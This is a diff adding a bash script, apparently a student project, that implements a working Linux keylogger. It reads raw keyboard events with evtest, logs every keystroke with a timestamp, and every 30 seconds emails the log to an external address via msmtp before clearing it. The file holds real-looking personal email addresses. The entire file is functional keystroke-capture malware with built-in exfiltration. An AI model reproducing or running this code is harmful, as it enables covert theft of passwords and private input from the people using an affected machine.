@@ -1,0 +1,95 @@
+#!/bin/bash
+
+# --- CONFIGURATION ---
+
+DEVICE="/dev/input/event3"                         # Your keyboard device
+LOGFILE="/home/binoy/OS/keylog.txt"               # Log file
+TO_EMAIL="cse_182210012101001@lus.ac.bd"          # Recipient
+FROM_EMAIL="binoydipu5@gmail.com"                 # Sender
+SUBJECT="Key Logger by Binoy"                      # Email subject
+SEND_INTERVAL=30                                   # Time in seconds
+
+# --- CHECK ROOT ---
+
+if [[ $EUID -ne 0 ]]; then
+    echo "Please run as root: sudo $0"
+    exit 1
+fi
+
+# --- Ensure log file is writable ---
+chmod 666 "$LOGFILE"
+
+# --- Variables for debouncing keys ---
+declare -A last_time_map
+
+# Function to log keys with debounce (300 ms)
+log_key() {
+    local key="$1"
+    echo "$(date '+%Y-%m-%d %H:%M:%S') $key" >> "$LOGFILE"
+}
+
+# --- Start Keylogging in Background ---
+
+echo "Starting keylogger... Output: $LOGFILE"
+> "$LOGFILE"
+
+# Start keylogger pipeline in background, save PID
+(
+    evtest "$DEVICE" | \
+    stdbuf -oL grep "EV_KEY.*value 1" | \
+    while read -r line; do
+        RAW_KEY=$(echo "$line" | sed -n 's/.*\(KEY_[A-Z0-9_]\+\).*/\1/p')
+
+        case "$RAW_KEY" in
+            KEY_SPACE) KEY="(SPACE)" ;;
+            KEY_ENTER) KEY="(ENTER)" ;;
+            KEY_BACKSPACE) KEY="(BACKSPACE)" ;;
+            KEY_TAB) KEY="(TAB)" ;;
+            KEY_LEFTSHIFT|KEY_RIGHTSHIFT) KEY="(SHIFT)" ;;
+            KEY_LEFTCTRL|KEY_RIGHTCTRL) KEY="(CTRL)" ;;
+            KEY_LEFTALT|KEY_RIGHTALT) KEY="(ALT)" ;;
+            KEY_ESC) KEY="(ESC)" ;;
+            KEY_CAPSLOCK) KEY="(CAPSLOCK)" ;;
+            KEY_DOT) KEY="." ;;
+            KEY_COMMA) KEY="," ;;
+            KEY_SLASH) KEY="/" ;;
+            KEY_MINUS) KEY="-" ;;
+            KEY_EQUAL) KEY="=" ;;
+            KEY_SEMICOLON) KEY=";" ;;
+            KEY_APOSTROPHE) KEY="'" ;;
+            KEY_LEFTBRACE) KEY="[" ;;
+            KEY_RIGHTBRACE) KEY="]" ;;
+            KEY_BACKSLASH) KEY="\\" ;;
+            KEY_GRAVE) KEY="\`" ;;
+            *) KEY=$(echo "$RAW_KEY" | sed 's/KEY_//') ;;
+        esac
+
+        # Call log_key function to debounce and write
+        log_key "$KEY"
+    done
+) &
+KEYLOGGER_PID=$!
+
+# --- Trap for cleanup on exit ---
+trap "echo; echo 'Stopping...'; kill $KEYLOGGER_PID; wait $KEYLOGGER_PID 2>/dev/null; exit" SIGINT SIGTERM
+
+# --- Email sender loop ---
+echo "Starting auto-mailer every $SEND_INTERVAL seconds..."
+
+while true; do
+    sleep "$SEND_INTERVAL"
+
+    if [[ -s "$LOGFILE" ]]; then
+        {
+            echo "From: $FROM_EMAIL"
+            echo "To: $TO_EMAIL"
+            echo "Subject: $SUBJECT"
+            echo
+            cat "$LOGFILE"
+        } | msmtp "$TO_EMAIL" && \
+        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Email sent to $TO_EMAIL" || \
+        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Failed to send email"
+
+        > "$LOGFILE"
+    fi
+done
